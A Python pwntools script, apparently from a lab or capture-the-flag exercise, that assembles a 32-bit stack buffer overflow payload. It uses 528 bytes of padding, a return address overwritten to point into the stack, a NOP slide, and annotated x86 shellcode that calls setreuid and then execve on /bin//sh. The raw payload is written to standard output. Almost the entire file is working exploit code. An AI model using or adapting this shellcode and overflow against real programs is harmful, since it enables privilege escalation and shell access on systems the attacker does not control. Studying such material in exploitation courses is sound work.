from pwn import *

print = lambda *args, **kwargs: None # override print function


# Generate a 528-byte cyclic pattern to identify the return address position (if needed)
# print(cyclic(1000))  # Generate a 1000-byte cyclic pattern

# crash_addr = 0x66616168
# print(cyclic_find(crash_addr))  # Uncomment to find the offset
# For this case, ret-address is at offset 528
ret_addr_pos = 528
buffer_address = 0xffffce8c  # Example buffer address; adjust for your environment

# Calculate the new return address to point to the shellcode
new_ret_address = buffer_address + ret_addr_pos + 8  # Shellcode starts right after ret address

# Initial payload with padding
payload = b"A" * ret_addr_pos  # Padding to fill the buffer
payload += p32(new_ret_address)  # Overwrite return address with the address pointing to the shellcode

NOP_SLIDE = 50  # Number of NOP instructions before shellcode

# Shellcode in Python
shellcode = (
    b"\x6a\x31"  # push 0x31 (geteuid())
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (setreuid())
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (setreuid(geteuid(), geteuid()))

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains "/bin//sh",\x00)

    b"\x52"      # push edx (push NULL into stack)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)

    b"\xb0\x0b"  # mov al, 0x0b (execve syscall number)
    b"\xcd\x80"  # int 0x80 (execve("/bin//sh", argv))

    b"\x6a\x01"  # push 1
    b"\x58"      # pop eax (sys_exit)
    b"\xcd\x80"  # int 0x80 (exit())
)

# Add NOP slide (\x90) before the shellcode for stability
nop_slide = b"\x90" * NOP_SLIDE
formatted_shellcode = nop_slide + shellcode

# Append the shellcode to the payload
payload += formatted_shellcode

# Print shellcode details
print("Shellcode code is:")
print("setreuid(geteuid(), geteuid())")
print("execv(\"/bin//sh\", argv)")

# Print shellcode as formatted string
formatted_string = "".join(f"\\x{byte:02x}" for byte in formatted_shellcode)
print("\nShellcode as formatted string:")
print(formatted_string)

# Print shellcode in hex format
print("\nShellcode in hex format:")
print(" ".join(f"{byte:02x}" for byte in formatted_shellcode))

# Calculate shellcode length
print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")

# Print shellcode as formatted string
formatted_string = "".join(f"\\x{byte:02x}" for byte in payload)

print("Final payload as formatted string:")
print(formatted_string)
# Final payload ready to be sent
print("\nFinal payload in hex:")
print(" ".join(f"{byte:02x}" for byte in payload))

sys.stdout.buffer.write(payload)
